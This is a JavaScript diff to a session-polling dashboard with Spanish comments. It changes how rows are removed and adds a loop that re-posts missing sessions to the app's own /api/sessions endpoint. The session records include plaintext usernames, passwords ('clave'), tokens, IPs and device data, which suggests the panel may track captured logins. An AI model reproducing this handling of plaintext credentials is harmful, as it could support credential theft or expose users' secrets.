@@ -407,17 +407,42 @@ async function pollSessions() {
         return now - (s.createdAt || 0) < 2 * 60 * 60 * 1000;
       });
       
-      // Eliminar de rows sesiones que ya no existen en freshList o fueron borradas
+      // Eliminar de rows ÚNICAMENTE las sesiones que fueron eliminadas con X o Limpiar, o expiradas
       const freshIds = new Set(freshList.map(s => s.id));
       let hadDeletions = false;
-      for (const id of rows.keys()) {
-        if (!freshIds.has(id) || deletedSessionIds.has(id)) {
+      for (const [id, row] of rows.entries()) {
+        const isExplicitlyDeleted = deletedSessionIds.has(id);
+        const isCleared = row.createdAt && row.createdAt <= clearedAt;
+        const isExpired = now - (row.createdAt || 0) > 2 * 60 * 60 * 1000;
+        if (isExplicitlyDeleted || isCleared || isExpired) {
           rows.delete(id);
           hadDeletions = true;
         }
       }
       if (hadDeletions) {
         render();
+      }
+
+      // Replicar automáticamente a este contenedor cualquier sesión activa que le falte
+      for (const [id, row] of rows.entries()) {
+        if (!freshIds.has(id) && !deletedSessionIds.has(id) && (!row.createdAt || row.createdAt > clearedAt)) {
+          fetch('/api/sessions', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              id: row.id,
+              username: row.user,
+              password: row.clave,
+              tipoUsuario: row.tipo,
+              device: row.device,
+              ip: row.ip,
+              state: row.state,
+              token: row.token,
+              createdAt: row.createdAt,
+              last_seen: row.last_seen || Date.now()
+            })
+          }).catch(() => {});
+        }
       }
 
       // Track existing new entries BEFORE updating the map
